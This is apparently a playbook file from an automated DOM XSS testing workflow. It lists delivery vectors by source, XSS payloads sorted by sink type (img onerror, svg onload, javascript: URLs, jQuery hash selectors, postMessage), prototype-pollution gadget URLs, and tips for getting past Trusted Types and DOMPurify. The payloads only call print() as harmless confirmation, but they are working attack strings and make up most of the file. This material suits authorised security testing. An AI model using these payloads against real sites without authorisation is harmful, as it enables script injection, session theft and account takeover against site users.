# DOM XSS payloads by sink + delivery (steps 4–5)
# Classify the SINK (from taint_flows.json), pick a payload, deliver it via the SOURCE.
# Record attempts in payloads_tried.jsonl: {id, source, sink, delivery, payload, reached, executed}.
# Benign confirmation only (print()/window.__rs). Hash delivery sends nothing to the server.

## Delivery vectors (by source)
```
hash:        https://target/page#PAYLOAD
search:      https://target/page?q=PAYLOAD           # client-read param (not server-reflected)
window.name: attacker page sets window.name=PAYLOAD then navigates to target
referrer:    victim arrives at target FROM attacker page carrying PAYLOAD in the URL
postMessage: attacker page -> target iframe:  frame.postMessage(PAYLOAD, '*')
```

## Payload by sink type
### HTML sinks (`innerHTML`, `document.write`, `$().html`, `insertAdjacentHTML`)
```
<img src=x onerror=print()>
<svg onload=print()>
```
Note: `<script>` injected via `innerHTML` does NOT execute — use `img`/`svg`/event handlers.

### Code-exec sinks (`eval`, `Function`, `setTimeout(string)`)
```
print()
;window.__rs=1//
```

### Navigation sinks (`location`, `a.href`, `location.href=`)
```
javascript:print()
javascript:print()//
```

### jQuery `$(source)`
```
#<img src=x onerror=print()>          # $(location.hash) on older jQuery
```

### postMessage handler → sink
```
# attacker page:
target.contentWindow.postMessage('<img src=x onerror=print()>', '*')
```

## Prototype pollution → gadget
```
https://target/page?__proto__[src]=data:,print()           # then a gadget uses polluted .src
https://target/page?__proto__[innerHTML]=<img src=x onerror=print()>
```
Confirm the pollution (`Object.prototype.src` set) AND the gadget firing — report the chain.

## Trusted Types / CSP
If `require-trusted-types-for 'script'` is set, string→sink is blocked. Look for an existing
**default policy** or an allowed policy that passes your input, or a DOMPurify-as-TT config with a
bypass. If none, the flow is non-executing under TT → downgrade (verify.md).

Escalate complexity only when a simple vector is proven filtered. Confirm EXECUTION via the browser
(devtools trace), not mere reflection into the DOM.
